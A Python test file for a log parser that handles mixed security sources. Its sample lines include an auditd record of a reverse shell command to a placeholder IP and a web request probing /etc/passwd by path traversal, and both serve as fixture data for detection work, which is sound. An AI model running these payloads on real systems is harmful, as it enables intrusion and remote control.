"""The mixed-source parser recognises each supported source and skips the rest."""
from killchain.mixed import looks_mixed, parse_line

LINES = {
    "panos": "1,2026/10/24 19:14:42,007051000012345,TRAFFIC,end,2561,2026/10/24 19:14:42,10.30.3.203,74.126.143.57,"
             "0.0.0.0,0.0.0.0,allow-trust,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,log-forward,"
             "2026/10/24 19:14:42,42721,1,13714,443,0,0,0x400053,tcp,allow,791837,3968847,744,765,309,pune-dc,36",
    "suricata": '{"timestamp":"2026-10-24T19:14:43.469216+0530","flow_id":1,"event_type":"alert","src_ip":"10.40.10.224",'
                '"src_port":35420,"dest_ip":"220.222.49.85","dest_port":443,"proto":"TCP","alert":{"action":"allowed",'
                '"signature_id":1,"signature":"ET POLICY test","category":"Misc activity","severity":2}}',
    "sshd": '<38>1 2026-10-28T12:18:37.008201+05:30 lx-web-22.corp.internal sshd 20584 - [origin software="rsyslogd"] '
            "Failed password for invalid user root from 198.51.100.7 port 44204 ssh2",
    "web": '198.51.100.9 - - [26/Oct/2026:09:47:56 +0530] "GET /api/v1/../../etc/passwd HTTP/1.1" 404 162 "-" "python-requests/2.32.3"',
    "auditd": 'type=EXECVE msg=audit(1793011085.046:9002): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/198.51.100.6/4444 0>&1"',
    "k8s": '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"ci"},"sourceIPs":["10.30.2.68"],'
           '"objectRef":{"resource":"pods","namespace":"prod"},"requestReceivedTimestamp":"2026-10-25T13:00:34.4Z",'
           '"requestObject":{"spec":{"containers":[{"securityContext":{"privileged":true}}]}}}',
    "cloudtrail": '{"eventVersion":"1.09","userIdentity":{"type":"Root","arn":"arn:aws:iam::1:root"},'
                  '"eventTime":"2026-10-28T14:57:06Z","eventName":"ConsoleLogin","sourceIPAddress":"198.51.100.8"}',
    "asa": "Oct 26 22:49:18 asa-edge-01 %ASA-6-113039: Group <corp-vpn> User <u.one> IP <198.51.100.5> AnyConnect parent session started.",
    "macos": "Oct 26 07:42:39 mbp-1 syspolicyd[778]: Gatekeeper assessment: /Users/Shared/App DENIED (unidentified developer) -- overridden by user u.two",
}


def test_each_source_is_read():
    for source, line in LINES.items():
        rec = parse_line(line, 1)
        assert rec is not None and rec["logid"] == source, source
        assert rec["ts"] > 0


def test_utc_sources_shift_to_local_wall_clock():
    rec = parse_line(LINES["k8s"], 1)
    assert "privileged=true" in rec["msg"]
    assert rec["ts"] // 10**9 % 86400 == (18 * 3600 + 30 * 60 + 34)  # 13:00:34Z shown as 18:30:34 local


def test_unknown_lines_are_skipped_and_mix_is_detected():
    assert parse_line("WS-1 Microsoft-Windows-Sysmon/Operational EventID=3 Image=x.exe", 1) is None
    assert looks_mixed(list(LINES.values()))
    assert not looks_mixed([LINES["web"]] * 5)
